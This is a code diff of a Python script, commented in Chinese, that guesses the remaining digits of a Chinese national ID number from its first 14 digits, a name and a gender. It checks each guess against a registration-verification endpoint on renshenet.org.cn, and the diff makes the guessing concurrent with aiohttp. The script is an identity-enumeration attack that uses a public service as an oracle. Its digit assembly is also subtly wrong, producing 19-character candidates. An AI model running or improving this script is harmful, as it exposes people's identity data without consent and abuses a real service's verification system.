@@ -1,11 +1,15 @@
 import random
-
 import requests
+import asyncio
+import aiohttp
+import hashlib
 
+# 获取用户输入
 idcard_prefix = input("身份证号码前14位：")
 name = input("姓名：")
 gender = input("性别（男/女）：")
 
+# 性别判断和第17位生成
 if gender.lower() == "男":
     idcard_17th = str(random.randint(1, 9))
 elif gender.lower() == "女":
@@ -14,10 +18,24 @@ else:
     print("性别输入错误，请输入'男'或'女'")
     exit()
 
-idcard_suffixes = [str(random.randint(0, 9999)).zfill(4) for _ in range(10000)]
-generated_idcards = [idcard_prefix + idcard_17th + suffix for suffix in idcard_suffixes]
 
-for idcard in generated_idcards:
+# 生成校验码函数（基于身份证校验规则）
+def calculate_checksum(id_number):
+    weights = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
+    checksum_list = ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2']
+    total = sum(int(id_number[i]) * weights[i] for i in range(17))
+    return checksum_list[total % 11]
+
+
+# 缓存已验证过的号码
+verified_cache = {}
+
+
+# 异步请求函数
+async def verify_idcard(session, idcard):
+    if idcard in verified_cache:
+        print(f"身份证号码 {idcard} 已缓存结果: {verified_cache[idcard]}")
+        return verified_cache[idcard]
 
     headers = {
         'Host': 'www.renshenet.org.cn',
@@ -41,10 +59,33 @@ for idcard in generated_idcards:
         "name": name
     }
 
-    response = requests.post('https://www.renshenet.org.cn/mobile/person/register/checkidcard', headers=headers,
-                             json=data)
+    try:
+        async with session.post('https://www.renshenet.org.cn/mobile/person/register/checkidcard', headers=headers,
+                                json=data) as response:
+            result = await response.json()
+            if result["data"]["isSucces"]:
+                print(f"身份证号码 {idcard} ✅验证通过")
+                verified_cache[idcard] = True
+            else:
+                print(f"身份证号码 {idcard} ❌验证未通过")
+                verified_cache[idcard] = False
+    except Exception as e:
+        print(f"请求错误: {e}")
+        verified_cache[idcard] = False
 
-    if response.json()["data"]["isSucces"]:
-        print(f"身份证号码 {idcard} ✅验证通过")
-    else:
-        print(f"身份证号码 {idcard} ❌验证未通过")
+
+# 主异步函数
+async def main():
+    idcard_suffixes = [str(random.randint(0, 999)).zfill(3) for _ in range(100)]
+    async with aiohttp.ClientSession() as session:
+        tasks = []
+        for suffix in idcard_suffixes:
+            idcard_without_checksum = idcard_prefix + idcard_17th + suffix
+            checksum = calculate_checksum(idcard_without_checksum)
+            idcard = idcard_without_checksum + checksum
+            tasks.append(verify_idcard(session, idcard))
+        await asyncio.gather(*tasks)
+
+
+# 运行异步函数
+asyncio.run(main())
